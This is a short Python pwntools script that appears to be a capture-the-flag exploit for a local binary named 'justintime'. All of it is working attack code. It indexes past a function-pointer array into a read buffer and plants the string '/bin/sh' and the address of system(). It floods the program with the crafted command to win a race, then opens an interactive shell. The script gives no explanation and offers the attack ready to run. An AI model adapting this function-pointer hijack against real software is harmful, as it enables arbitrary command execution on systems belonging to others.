from pwn import *

def fakehead(task, nparams):
    return (task | (nparams << 8))

if __name__ == "__main__":
    func_array = 0x81284C0
    read_buffer = 0x812B620
    system = 0x8077110
    puts = 0x8081270

    p = process("./justintime")
    p.sendline("log on")

    idx = (read_buffer + 0x80 - func_array)//4
    command = "p 4 gcd {} {} {} {} {}".format(u32("/bin"),u32("/sh\x00"),0,1,idx)
    command = command.ljust(0x80,"\x00")
    command += p32(system)

    for i in range(100):
        p.sendline(command) #race it    
    
    p.interactive()